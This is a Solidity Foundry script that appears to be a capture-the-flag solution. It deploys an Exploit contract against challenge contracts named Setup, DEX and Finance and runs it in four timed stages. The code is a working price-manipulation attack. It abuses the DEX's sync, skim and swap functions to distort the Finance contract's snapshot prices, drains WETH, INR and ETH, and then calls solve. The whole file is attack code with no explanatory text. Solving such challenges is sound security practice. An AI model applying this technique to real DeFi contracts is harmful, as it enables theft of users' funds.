//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {Test} from "forge-std/Test.sol";
import {Setup} from "./Setup.sol";
import {DEX} from "./DEX.sol";
import {Finance} from "./Finance.sol";
import {IERC20} from "@openzeppelin-contracts/token/ERC20/IERC20.sol";


contract Exploit {
    Setup setup;
    DEX dex;
    Finance finance;
    address WETH;
    address INR;

    receive() external payable {}
    constructor(Setup _setup) {
        setup = _setup;
        dex = setup.dex();
        finance = setup.finance();
        WETH = setup.WETH();
        INR = setup.INR();
    }
    function stage1() external {
        setup.claimBonus1();
        finance.snapshot();
        dex.sync();
        finance.stake{value: address(this).balance}(WETH);
        
        // 1. withdraw all WETH from dex
        uint256 amount = IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).transfer(address(dex), amount);
        dex.swap(WETH, amount, 0, address(this));
        IERC20(INR).transfer(address(dex), IERC20(WETH).balanceOf(address(dex)));
        dex.skim(address(this));
        
        // 2. claim bonus2
        setup.claimBonus2();
        IERC20(WETH).transfer(address(dex), 1);
        finance.snapshot();
        dex.sync();
    }

    function stage2() external {
        IERC20(WETH).transfer(address(dex), 1e18);
        dex.swap(WETH, 1, 0, address(this));
        uint256 gap = IERC20(WETH).balanceOf(address(dex)) - IERC20(INR).balanceOf(address(dex));
        IERC20(INR).transfer(address(dex), gap);
        IERC20(WETH).transfer(address(dex), 10000e18);
        dex.sync();
    }

    function stage3() external {
        // 4. withdraw ETH from finance
        finance.snapshot();
        dex.sync();
        IERC20(INR).transfer(address(finance), 262473*1e14);
        finance.withdraw(INR, 0);

        IERC20(INR).transfer(address(dex), 10000e18 + (1 ether - 1e11));
        dex.skim(address(this));
        finance.snapshot();
    }

    function stage4() external {
        // 5. withdraw INR from  finance
        dex.sync();
        finance.stake{value: 1.1 ether}(INR);
        IERC20(WETH).transfer(address(dex), setup.WETH_SUPPLIED_BY_LP());
        IERC20(INR).transfer(address(dex), setup.INR_SUPPLIED_BY_LP());
        dex.sync();
        finance.stake{value: 100_000 ether - IERC20(WETH).balanceOf(address(this))}(WETH);
        setup.solve();
        (uint256 wethPrice, uint256 inrPrice) = finance.getPrice();
        console.log("wethPrice", wethPrice);
        console.log("inrPrice", inrPrice);
        console.log("player inr balance", IERC20(INR).balanceOf(address(this))/1e18);
        console.log("player weth balance", IERC20(WETH).balanceOf(address(this))/1e18);
        console.log("player eth balance", address(this).balance/1e18);
        console.log("dex inr balance", IERC20(INR).balanceOf(address(dex)));
        console.log("dex weth balance", IERC20(WETH).balanceOf(address(dex)));
        console.log("dex eth balance", address(dex).balance);
        console.log("finance inr balance", IERC20(INR).balanceOf(address(finance))/1e18);
        console.log("finance weth balance", IERC20(WETH).balanceOf(address(finance))/1e18);
        console.log("finance eth balance", address(finance).balance/1e18);
        console.log("isSolved", setup.isSolved());
    }
}

contract SolveContract is Script{
    function run() public {
        vm.startBroadcast();
        Setup setup = Setup(vm.envAddress("SETUP"));
        Exploit exploit = new Exploit(setup);
        vm.warp(block.timestamp+60);
        exploit.stage1();
        console.log("exploit contract balance", address(exploit).balance);
        vm.warp(block.timestamp+10);
        exploit.stage2();
        vm.warp(block.timestamp+60);
        exploit.stage3();
        vm.warp(block.timestamp+10);
        exploit.stage4();
        vm.stopBroadcast();
    }
}